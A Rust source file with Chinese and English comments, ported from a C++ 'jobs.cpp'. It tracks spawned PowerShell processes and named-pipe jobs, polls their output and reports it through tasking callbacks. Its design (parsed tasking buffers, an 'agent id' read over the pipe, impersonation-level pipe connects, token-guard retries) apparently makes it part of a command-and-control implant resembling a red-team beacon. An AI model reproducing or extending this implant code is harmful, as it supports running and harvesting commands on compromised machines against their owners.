//! 作业跟踪（jobs.cpp）。
//! Job tracking (jobs.cpp).

use crate::bformat::FormatP;
use crate::callback::{post_error_d, Callback};
use crate::commands::{CALLBACK_JOBS, CALLBACK_OUTPUT, CALLBACK_OUTPUT_OEM, JOB_MODE_BYTE, JOB_MODE_MESSAGE};
use crate::parse::DataP;
use parking_lot::Mutex;
use windows_sys::Win32::Foundation::{
    CloseHandle, GetLastError, HANDLE, ERROR_PIPE_BUSY, GENERIC_READ, GENERIC_WRITE, WAIT_TIMEOUT,
};
use windows_sys::Win32::Storage::FileSystem::{
    CreateFileA, ReadFile, OPEN_EXISTING, SECURITY_ANONYMOUS, SECURITY_IMPERSONATION,
    SECURITY_SQOS_PRESENT,
};
use windows_sys::Win32::System::Pipes::{
    DisconnectNamedPipe, PeekNamedPipe, WaitNamedPipeA, PIPE_READMODE_BYTE,
    SetNamedPipeHandleState,
};
use windows_sys::Win32::System::Threading::{PROCESS_INFORMATION, WaitForSingleObject};
use windows_sys::Win32::Foundation::SetLastError;

pub const JOB_ENTRY_PROCESS: i16 = 0;
pub const JOB_ENTRY_NAMEDPIPE: i16 = 1;

pub const JOB_STATUS_GOOD: i16 = 0;
pub const JOB_STATUS_DEAD: i16 = 1;

pub const JOB_DESCRIPTION_LENGTH: usize = 64;

/// 与 C 的 `psh_entry` 对应的 `PshEntry`。句柄字段用 `isize` 以便结构体实现 `Send`
/// （C 结构体存的是原始 HANDLE；数值相同）。
/// `PshEntry` — like the C `psh_entry`. Handle fields are `isize` so the
/// struct is `Send` (the C struct stores raw HANDLEs; the values are the
/// same).
#[derive(Default, Clone)]
pub struct PshEntry {
    pub jid: u32,
    pub h_process: isize,
    pub h_thread: isize,
    pub read_stdout: isize,
    pub write_stdout: isize,
    pub tag: i16,
    pub status: i16,
    pub pid: u32,
    pub rtype: i32,
    pub mode: i16,
    pub description: Vec<u8>,
}

static PSH_LIST: Mutex<Vec<PshEntry>> = Mutex::new(Vec::new());
static JIDS: Mutex<u32> = Mutex::new(0);

/// 清理进程句柄。
/// Clean up process handles.
pub fn cleanup_process(pi: &PROCESS_INFORMATION) {
    unsafe {
        if pi.hProcess as isize != -1 && !pi.hProcess.is_null() {
            CloseHandle(pi.hProcess);
        }
        if pi.hThread as isize != -1 && !pi.hThread.is_null() {
            CloseHandle(pi.hThread);
        }
    }
}

/// 跟踪一个正在运行的 powershell 进程。
/// Track a running powershell process.
pub fn psh_track(pi: &PROCESS_INFORMATION, read_stdout: isize, write_stdout: isize) {
    let entry = process_track(pi, read_stdout, write_stdout, b"process");
    let mut list = PSH_LIST.lock();
    if let Some(e) = list.iter_mut().find(|e| e.jid == entry.jid) {
        e.rtype = CALLBACK_OUTPUT_OEM; // cmd.exe/powershell.exe 使用 OEM 编码 / cmd.exe/powershell.exe use OEM encoding
    }
}

/// 跟踪任意一个正在运行的进程。
/// Track an arbitrary running process.
pub fn process_track(
    pi: &PROCESS_INFORMATION,
    read_stdout: isize,
    write_stdout: isize,
    desc: &[u8],
) -> PshEntry {
    let mut entry = PshEntry {
        h_process: pi.hProcess as isize,
        h_thread: pi.hThread as isize,
        read_stdout,
        write_stdout,
        tag: JOB_ENTRY_PROCESS,
        status: JOB_STATUS_GOOD,
        pid: pi.dwProcessId,
        rtype: CALLBACK_OUTPUT,
        mode: JOB_MODE_BYTE,
        description: desc.to_vec(),
        ..Default::default()
    };
    let mut jids = JIDS.lock();
    entry.jid = *jids;
    *jids += 1;
    drop(jids);

    let mut list = PSH_LIST.lock();
    list.push(entry);
    list.last().cloned().unwrap()
}

/// 跟踪一个命名管道。
/// Track a named pipe.
pub fn pipe_track(read_stdout: isize, pid: u32, rtype: i32, description: &[u8], mode: i16) {
    let mut entry = PshEntry {
        read_stdout,
        write_stdout: -1,
        tag: JOB_ENTRY_NAMEDPIPE,
        status: JOB_STATUS_GOOD,
        pid,
        rtype,
        mode,
        description: description.to_vec(),
        ..Default::default()
    };
    let mut jids = JIDS.lock();
    entry.jid = *jids;
    *jids += 1;
    drop(jids);
    PSH_LIST.lock().push(entry);
}

fn psh_prune_list() {
    let mut list = PSH_LIST.lock();
    // 清理死条目
    // cleanup dead entries
    for temp in list.iter() {
        if temp.status == JOB_STATUS_DEAD {
            unsafe {
                if temp.tag == JOB_ENTRY_PROCESS {
                    CloseHandle(temp.h_process as HANDLE);
                    CloseHandle(temp.h_thread as HANDLE);
                    CloseHandle(temp.read_stdout as HANDLE);
                    CloseHandle(temp.write_stdout as HANDLE);
                } else if temp.tag == JOB_ENTRY_NAMEDPIPE {
                    DisconnectNamedPipe(temp.read_stdout as HANDLE);
                    CloseHandle(temp.read_stdout as HANDLE);
                }
            }
        }
    }
    // 剪除（清除死条目）
    // prune
    list.retain(|e| e.status != JOB_STATUS_DEAD);
}

/// 轮询任何正在运行的 powershell 进程的输出并上报。
/// Poll any running powershell processes for output and report it.
pub fn psh_poll(callback: Callback, max: usize) {
    let mut bufferz = vec![0u8; max];

    {
        let mut list = PSH_LIST.lock();
        for temp in list.iter_mut() {
            let total_read;
            if temp.mode == JOB_MODE_MESSAGE {
                total_read = read_blob_from_pipe(temp.read_stdout, &mut bufferz, max);
            } else {
                total_read = read_all_from_pipe(temp.read_stdout, &mut bufferz, max);
            }

            if total_read > 0 {
                callback(&bufferz[..total_read as usize], total_read, temp.rtype);
            }

            // 检查管道是否还活着
            // check if the pipe is alive or not
            if temp.tag == JOB_ENTRY_NAMEDPIPE && total_read == -1 {
                temp.status = JOB_STATUS_DEAD;
            } else if temp.tag == JOB_ENTRY_PROCESS
                && unsafe { WaitForSingleObject(temp.h_process as HANDLE, 0) } == WAIT_TIMEOUT
            {
                // 进程存活
                // alive
            } else if temp.tag == JOB_ENTRY_PROCESS
                && unsafe { WaitForSingleObject(temp.h_process as HANDLE, 0) } != WAIT_TIMEOUT
            {
                temp.status = JOB_STATUS_DEAD;
            }

            if temp.status == JOB_STATUS_DEAD {
                // 这里无需额外处理；psh_prune_list 会负责清理
                // nothing extra to do here; psh_prune_list handles cleanup
            }
        }
    }

    bufferz.fill(0);
    drop(bufferz);

    // 处理死条目
    // process dead entries
    psh_prune_list();
}

pub fn read_blob_from_pipe(handle: isize, buffer: &mut [u8], maxlength: usize) -> i32 {
    unsafe {
        let mut avail: u32 = 0;
        // -1 表示管道已关闭
        // -1 means the pipe closed
        if PeekNamedPipe(handle as HANDLE, std::ptr::null_mut(), 0, std::ptr::null_mut(), &mut avail, std::ptr::null_mut()) == 0 {
            return -1;
        }
        // 0 表示管道还活着，但没有数据
        // 0 means we're alive, but no data
        if avail <= 0 {
            return 0;
        }
        // 读取我们的长度（4 字节）吧
        // read our length plz
        let mut get: i32 = 0;
        let rlen = read_all(handle, &mut get as *mut i32 as *mut u8, 4);
        if rlen == -1 || rlen != 4 {
            return -1;
        }
        // 校验 get 值是否合理
        // sanity check our get value
        if get as usize > maxlength {
            return -1;
        }
        read_all(handle, buffer.as_mut_ptr(), get as usize)
    }
}

pub fn read_all_from_pipe(handle: isize, buffer: &mut [u8], maxlength: usize) -> i32 {
    unsafe {
        let mut avail: u32 = 0;
        let mut total_read: u32 = 0;
        if PeekNamedPipe(handle as HANDLE, std::ptr::null_mut(), 0, std::ptr::null_mut(), &mut avail, std::ptr::null_mut()) == 0 {
            return -1;
        }
        while avail > 0 && total_read < maxlength as u32 {
            let mut bread: u32 = 0;
            ReadFile(
                handle as HANDLE,
                buffer[total_read as usize..].as_mut_ptr() as *mut _,
                maxlength as u32 - total_read,
                &mut bread,
                std::ptr::null_mut(),
            );
            total_read += bread;
            if PeekNamedPipe(handle as HANDLE, std::ptr::null_mut(), 0, std::ptr::null_mut(), &mut avail, std::ptr::null_mut()) == 0 {
                return -1;
            }
        }
        total_read as i32
    }
}

/// 从句柄精确读取 `size` 个字节（对应 C++ 中的 read_all）。
/// Read exactly `size` bytes from a handle (read_all in the C++).
pub fn read_all(handle: isize, buffer: *mut u8, size: usize) -> i32 {
    unsafe {
        let mut total: usize = 0;
        while total < size {
            let mut bread: u32 = 0;
            if ReadFile(handle as HANDLE, buffer.add(total) as *mut _, (size - total) as u32, &mut bread, std::ptr::null_mut()) == 0 {
                return -1;
            }
            if bread == 0 {
                return -1;
            }
            total += bread as usize;
        }
        total as i32
    }
}

fn _connect_pipe_level(pipename: &[u8], pipe: &mut isize, _level: u32) -> bool {
    unsafe {
        loop {
            let mut name = pipename.to_vec();
            name.push(0);
            *pipe = CreateFileA(
                name.as_ptr() as *const _,
                GENERIC_READ | GENERIC_WRITE,
                0,
                std::ptr::null(),
                OPEN_EXISTING,
                SECURITY_SQOS_PRESENT | _level,
                std::ptr::null_mut(),
            ) as isize;

            if *pipe as isize != -1 {
                break;
            }
            if GetLastError() != ERROR_PIPE_BUSY {
                return false;
            }
            if WaitNamedPipeA(name.as_ptr() as *const _, 10000) == 0 {
                SetLastError(WAIT_TIMEOUT);
                return false;
            }
        }

        // 恭喜……已连接。读取一个 agent id
        // congrats.. we're connected. read an agent id
        let mut mode: u32 = PIPE_READMODE_BYTE;
        let status = SetNamedPipeHandleState(*pipe as HANDLE, &mode, std::ptr::null_mut(), std::ptr::null_mut());
        if status == 0 {
            DisconnectNamedPipe(*pipe as HANDLE);
            CloseHandle(*pipe as HANDLE);
            return false;
        }
        true
    }
}

/// 连接管道，并较为优雅地处理令牌丢弃/不丢弃。
/// Connect to a pipe, handling token drop / no-drop with some grace.
pub fn connect_pipe_level(pipename: &[u8], pipe: &mut isize, level: u32) -> bool {
    if level == SECURITY_ANONYMOUS {
        let result = _connect_pipe_level(pipename, pipe, level);
        if !result && unsafe { GetLastError() } == 5 {
            crate::tokens::token_guard_start();
            let result = _connect_pipe_level(pipename, pipe, level);
            crate::tokens::token_guard_stop();
            return result;
        }
        return result;
    } else {
        _connect_pipe_level(pipename, pipe, level)
    }
}

/// 默认应始终为 SECURITY_ANONYMOUS。
/// Default should always be SECURITY_ANONYMOUS.
pub fn connect_pipe(pipename: &[u8], pipe: &mut isize) -> bool {
    connect_pipe_level(pipename, pipe, SECURITY_ANONYMOUS)
}

/// 最多等待 [wait] 毫秒，直到该管道出现数据。
/// Wait for up to [wait] ms for data to appear in this pipe.
pub fn pipe_try(handle: isize, wait: u32) {
    let stopat = unsafe { windows_sys::Win32::System::SystemInformation::GetTickCount() } + wait;
    unsafe {
        while windows_sys::Win32::System::SystemInformation::GetTickCount() < stopat {
            let mut avail: u32 = 0;
            if PeekNamedPipe(handle as HANDLE, std::ptr::null_mut(), 0, std::ptr::null_mut(), &mut avail, std::ptr::null_mut()) == 0 {
                return;
            } else if avail > 0 {
                return;
            } else {
                std::thread::sleep(std::time::Duration::from_millis(500));
            }
        }
    }
}

pub fn command_job_register(buffer: &[u8], length: usize, impersonate: bool, mode: i16) {
    let mut pipename = vec![0u8; 64];
    let mut description = vec![0u8; JOB_DESCRIPTION_LENGTH];

    let mut parser = DataP::init(&mut buffer.to_vec());
    let pid = parser.data_int();
    let rtype = parser.data_short() as i32;
    let wait = parser.data_short() as u32;
    if parser.data_string(&mut pipename, 64) == 0 {
        return;
    }
    if parser.data_string(&mut description, JOB_DESCRIPTION_LENGTH) == 0 {
        return;
    }

    let level = if impersonate { SECURITY_IMPERSONATION } else { SECURITY_ANONYMOUS };

    // 最多尝试 20 次（500ms × 20 = 10s 阻塞）连接管道
    // try up to 20x (500ms = 10s block) to connect to pipe
    for _ in 0..20 {
        let mut phandle: isize = 0;
        if connect_pipe_level(&pipename, &mut phandle, level) {
            if wait > 0 {
                pipe_try(phandle, wait);
            }
            pipe_track(phandle, pid, rtype, &description, mode);
            return;
        } else {
            std::thread::sleep(std::time::Duration::from_millis(500));
        }
    }

    post_error_d(0x14, unsafe { GetLastError() } as i32);
}

pub fn command_jobs(callback: Callback) {
    let list = PSH_LIST.lock();
    let mut format = FormatP::init(32768);
    for temp in list.iter() {
        format.bformat_printf(format_args!(
            "{}\t{}\t{}",
            temp.jid,
            temp.pid,
            String::from_utf8_lossy(&temp.description)
        ));
        format.bformat_copy(b"\n");
    }
    let data = format.bformat_string().to_vec();
    let len = format.bformat_length();
    callback(&data, len as i32, CALLBACK_JOBS);
    format.free();
}

pub fn command_job_kill(buffer: &[u8], length: usize) {
    let mut parser = DataP::init(&mut buffer.to_vec());
    let jid = parser.data_short() as u32;

    let mut list = PSH_LIST.lock();
    for temp in list.iter_mut() {
        if temp.jid == jid {
            temp.status = JOB_STATUS_DEAD;
        }
    }
    drop(list);
    psh_prune_list();
}
